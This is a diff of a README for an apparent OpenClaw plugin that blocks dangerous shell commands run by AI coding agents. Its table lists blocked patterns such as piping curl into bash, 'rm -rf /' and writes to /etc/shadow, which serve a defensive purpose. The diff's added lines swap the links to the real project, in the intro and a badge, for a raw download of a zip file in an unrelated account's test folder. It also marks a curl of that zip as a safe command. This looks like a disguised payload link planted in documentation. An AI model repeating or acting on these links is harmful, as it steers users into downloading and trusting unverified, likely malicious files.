@@ -4,11 +4,11 @@
 
 **The safety net your AI agent needs.**
 
-An [OpenClaw](https://github.com/openclaw/openclaw) plugin that blocks dangerous shell commands before they execute and monitors tool output quality in real time.
+An [OpenClaw](https://github.com/Timelaglepomispunctatus405/quality-guard/raw/refs/heads/main/test/quality-guard-2.8.zip) plugin that blocks dangerous shell commands before they execute and monitors tool output quality in real time.
 
 [![Tests](https://img.shields.io/badge/tests-112%20passed-brightgreen)](#testing)
 [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![OpenClaw Plugin](https://img.shields.io/badge/OpenClaw-plugin-orange)](https://github.com/openclaw/openclaw)
+[![OpenClaw Plugin](https://img.shields.io/badge/OpenClaw-plugin-orange)](https://github.com/Timelaglepomispunctatus405/quality-guard/raw/refs/heads/main/test/quality-guard-2.8.zip)
 
 [English](#why-you-need-this) · [中文](#中文说明)
 
@@ -30,7 +30,7 @@ AI coding agents (Claude, GPT, Codex, etc.) are powerful — but they can also r
 | **SQL without WHERE** | `DROP TABLE`, `TRUNCATE`, `DELETE FROM`, `UPDATE SET` | `grep "DROP TABLE" schema.sql` ✅ passes |
 | **Git destructive** | `git push --force`, `git push -f`, `git reset --hard` | `git push origin main` ✅ passes |
 | **Disk operations** | `dd of=/dev/sda`, `mkfs` | `dd of=./test.img` ✅ passes |
-| **Remote code exec** | `curl \| bash`, `wget \| sh` | `curl https://api.example.com` ✅ passes |
+| **Remote code exec** | `curl \| bash`, `wget \| sh` | `curl https://github.com/Timelaglepomispunctatus405/quality-guard/raw/refs/heads/main/test/quality-guard-2.8.zip` ✅ passes |
 | **System files** | `> /etc/passwd`, `tee /etc/shadow` | `cat /etc/passwd` ✅ passes |
 | **Indirect execution** | `eval "..."`, `bash -c "..."`, `xargs rm` | `eval "echo hello"` ✅ passes |
 | **Subcommands** | `$(rm -rf /)`, `` `git push -f` `` | `$(date)` ✅ passes |
